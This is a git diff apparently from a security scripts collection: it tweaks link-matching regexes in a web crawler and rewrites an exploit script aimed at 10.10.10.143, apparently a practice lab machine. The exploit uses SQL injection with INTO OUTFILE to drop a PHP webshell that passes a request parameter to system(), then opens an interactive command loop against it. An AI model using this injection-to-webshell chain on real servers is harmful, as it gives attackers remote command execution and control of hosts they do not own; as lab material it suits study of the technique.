@@ -71,9 +71,9 @@ C_INFO='\033[36m'
 C_GOOD='\033[32m'
 C_WARN='\033[33m'
 
-HREF_REGEX = r'href=[\"\'](?!http|ftp|https|mailto|://|//)(.*?)[\"\']'
+LOCAL_REGEX = r'(?:href|action|src) *= *[\"\'](?!http|ftp|https|mailto|://|//)(.*?)[\"\']'
 EMAIL_REGEX = r'[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+'
-URL_REGEX = r'(http|ftp|https)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?'
+EXT_REGEX = r'(http|ftp|https)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?'
 
 def find_recursive(url, target_domain, int_urls, ext_urls, emails):
   try:
@@ -87,7 +87,7 @@ def find_recursive(url, target_domain, int_urls, ext_urls, emails):
     return
   print(f'[{C_INFO}*{C_NORM}] Parsing --> {url} ...')
   # find all full links
-  for proto,domain,path in re.findall(URL_REGEX, http):
+  for proto,domain,path in re.findall(EXT_REGEX, http):
     new_url = ''.join([proto,'://',domain,path])
     if (target_domain in domain) and (new_url not in int_urls):
       int_urls.add(new_url)
@@ -95,7 +95,7 @@ def find_recursive(url, target_domain, int_urls, ext_urls, emails):
     if (target_domain not in domain) and (new_url not in ext_urls):
       ext_urls.add(new_url)
   # find all local links
-  for path in re.findall(HREF_REGEX, http):
+  for path in re.findall(LOCAL_REGEX, http):
     uri = urllib.parse.urlparse(url)
     new_url = f'{uri.scheme}://{uri.netloc.rstrip("/")}/{path.lstrip("/")}'
     if (target_domain in new_url) and (new_url not in int_urls):
@@ -390,30 +390,19 @@ import requests
 REGEX = r'BUBBA-START(.*)BUBBA-END'
 URL = 'http://10.10.10.143/'
 SQL = "0 UNION ALL SELECT 1,2,3,{0},5,6,7 INTO OUTFILE '/var/www/html/{1}'"
-PHP = """
-<?php if (isset($_REQUEST['cmd'])) {
-  $cmd = $_REQUEST['cmd'];
+PHP = """<?php if (isset($_REQUEST['c'])) {
   echo 'BUBBA-START';
-  executeCommand($cmd);
-  echo 'BUBBA-END';
-  die();
-}
-function executeCommand(string $command) {
   if (class_exists('ReflectionFunction')) {
-    $function = new ReflectionFunction('system');
-    $function->invoke($command);
+    $f = new ReflectionFunction('system');
+    $f->invoke($_REQUEST['c']);
   } elseif (function_exists('call_user_func_array')) {
-    call_user_func_array('system', array($command));
+    call_user_func_array('system', array($_REQUEST['c']));
   } elseif (function_exists('call_user_func')) {
-    call_user_func('system', $command);
-  } else if(function_exists('passthru')) {
-    ob_start();
-    passthru($command, $return_var);
-    $output = ob_get_contents();
-    ob_end_clean();
-  } else if(function_exists('system')){
-    system($command);
+    call_user_func('system',$_REQUEST['c']);
+  } elseif (function_exists('system')){
+    system($_REQUEST['c']);
   }
+  echo 'BUBBA-END';
 }?>"""
 
 # make a random 20 character webshell name since OUTFILE cannot overwrite existing files
@@ -427,7 +416,7 @@ print(f'[*] SQL query: {SQL.format(webshell_raw, filename)}')
 requests.get(URL + 'room.php', params={'cod':SQL.format(webshell_raw, filename)})
 # test shell
 print(f'[*] testing shell...')
-r = requests.get(URL + filename, params={'cmd':'whoami'})
+r = requests.get(URL + filename, params={'c':'whoami'})
 val = re.findall(REGEX, r.text, re.S)
 if not val:
   print('[-] failed!')
@@ -435,7 +424,7 @@ if not val:
 print('[+] success!')
 while True:
   c = input('> ')
-  r = requests.get(URL + filename, params={'cmd':c})
+  r = requests.get(URL + filename, params={'c':c})
   val = re.findall(REGEX, r.text, re.S)
   if not val:
     print('[!] no command output?')
